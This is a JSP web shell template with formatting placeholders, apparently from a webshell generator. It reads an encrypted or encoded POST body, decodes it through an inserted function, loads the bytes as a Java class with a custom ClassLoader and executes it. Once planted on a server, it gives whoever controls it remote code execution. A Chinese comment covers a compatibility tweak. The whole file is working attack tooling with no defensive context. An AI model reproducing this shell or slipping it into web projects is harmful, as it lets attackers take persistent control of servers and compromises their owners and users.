<%%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %%>
<%%!
%s
%%>
<%%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%%><%%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性
            out.clear();
            out=pageContext.pushBody();
            */
            out.clear();
            out=pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(%s(bos.toByteArray())).newInstance().equals(pageContext);}
%%>